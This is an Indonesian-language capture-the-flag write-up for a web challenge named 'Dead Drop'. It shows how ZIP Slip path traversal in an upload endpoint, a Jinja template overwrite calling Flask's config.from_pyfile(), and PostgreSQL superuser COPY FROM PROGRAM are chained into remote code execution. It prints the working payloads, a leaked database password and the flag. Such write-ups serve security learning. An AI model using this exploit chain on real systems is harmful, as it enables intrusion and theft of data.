# Dead Drop

## Ringkasan

Bug utama ada di upload ZIP. Nama entry ZIP digabung langsung ke path tujuan tanpa normalisasi:

```python
dest = upload_dir / entry.filename
```

Karena itu entry seperti `../../templates/partials/header.txt` bisa keluar dari `/app/uploads/<uid>` dan overwrite template yang di-include oleh `/report`.

Template `header.txt` dieksekusi oleh Jinja `SandboxedEnvironment`. Sandbox memblokir akses atribut internal, tetapi route `/report` mengirim `config=current_app.config` ke template. Method publik Flask `config.from_pyfile()` masih bisa dipanggil, dan method itu mengeksekusi file Python. File Python bisa ikut di-upload sebagai `evil.txt`.

## Target dan File

Target remote:

```text
https://http-01kz0xpw518e5y0ek9hnv166bm.u-ctf-ctf-7001b39a.urc.tf/
```

File lokal penting:

```text
app/upload.py
app/routes.py
app/admin.py
templates/report.html
templates/partials/header.txt
```

## Analisis Awal

Akun `dispatch / fr3ight_c0ntrol` berhasil login, tetapi role-nya `user`, bukan admin. Endpoint admin ada dan memiliki `pickle.loads()`, tetapi butuh role `admin`.

Upload bundle menerima ZIP dan hanya memfilter ekstensi entry:

```python
ext = Path(entry.filename).suffix.lower()
if ext not in ALLOWED_EXTENSIONS:
    continue
```

Tidak ada validasi `..`, absolute path, atau hasil `resolve()`.

## Source Code Review

`/report` selalu meng-include partial:

```jinja2
{% include "partials/header.txt" %}
```

Route-nya mengirim `uid` dan `config`:

```python
return template.render(files=files, uid=uid, config=current_app.config)
```

Ini membuat payload di `header.txt` bisa memanggil:

```jinja2
{{ config.from_pyfile('/app/uploads/' ~ uid ~ '/evil.txt') }}
```

`evil.txt` adalah Python valid. Walaupun ekstensi `.txt`, Flask tetap mengeksekusinya lewat `from_pyfile()`.

## Vulnerability

Ada dua bug yang dirantai:

1. ZIP Slip di `/api/upload`, karena nama entry ZIP bisa melakukan path traversal.
2. Code execution via Jinja template overwrite + `config.from_pyfile()`.

RCE pertama berjalan sebagai user `ctf`, jadi `/root/flag.txt` di container web tidak bisa dibaca langsung. Dari RCE, environment membocorkan kredensial PostgreSQL:

```text
DB_HOST=dead-drop-db
DB_USER=deadrop
DB_PASS=oXeNoG6EVuiBy4ijerXZteJJGxVJGGv7
```

User PostgreSQL `deadrop` adalah superuser. PostgreSQL superuser bisa menjalankan command di container DB lewat `COPY FROM PROGRAM`.

## Eksploitasi

ZIP exploit berisi dua file:

```text
evil.txt
../../templates/partials/header.txt
```

`header.txt` memuat template payload:

```jinja2
DD_START{{ config.from_pyfile('/app/uploads/' ~ uid ~ '/evil.txt') }}{{ config.OUT }}DD_END
```

`evil.txt` connect ke PostgreSQL memakai env dari container web, lalu menjalankan:

```sql
CREATE TEMP TABLE dd_flag(line text);
COPY dd_flag FROM PROGRAM 'cat /root/flag.txt 2>&1';
SELECT line FROM dd_flag;
```

Output command muncul di response `/report` di antara marker `DD_START` dan `DD_END`.

## Solve Script

Script final ada di `solve.py`. Script login sebagai `dispatch`, upload ZIP payload, trigger `/report`, parse flag, lalu restore `templates/partials/header.txt` ke isi awal.

## Cara Menjalankan

Remote default:

```bash
python3 solve.py
```

Target custom:

```bash
python3 solve.py "https://target.example/"
```

## Flag

```text
uctf{52faaf576ae1b6002a65ac401af9fc6fe748}
```

## Catatan Stabilitas

Exploit butuh satu worker dapat memuat ulang template setelah overwrite. Aplikasi memakai `SandboxedEnvironment(auto_reload=True)`, jadi perubahan `header.txt` langsung dipakai saat `/report` diakses.

Payload tidak melakukan fuzzing dan hanya menyentuh endpoint challenge. Setelah flag didapat, script mengembalikan isi `header.txt` ke banner bawaan.
